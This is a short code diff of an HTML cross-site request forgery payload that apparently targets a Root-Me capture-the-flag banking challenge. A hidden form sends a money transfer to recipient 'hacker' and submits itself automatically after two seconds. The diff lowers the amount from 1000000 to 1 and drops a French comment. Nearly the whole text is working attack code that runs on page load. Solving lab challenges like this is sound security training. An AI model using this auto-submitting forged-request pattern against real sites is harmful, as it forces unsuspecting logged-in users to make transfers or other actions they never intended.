@@ -1,10 +1,10 @@
 <form id="transfer-form" action="https://bankme-1.challenges.pro.root-me.org/transfer" method="POST">
     <input type="hidden" name="recipient" value="hacker">
-    <input type="hidden" name="amount" value="1000000">
+    <input type="hidden" name="amount" value="1">
 </form>
 
 <script>
     setTimeout(() => {
         document.getElementById('transfer-form').submit();
-    }, 2000);  // Petite pause pour éviter un blocage
+    }, 2000);
 </script>
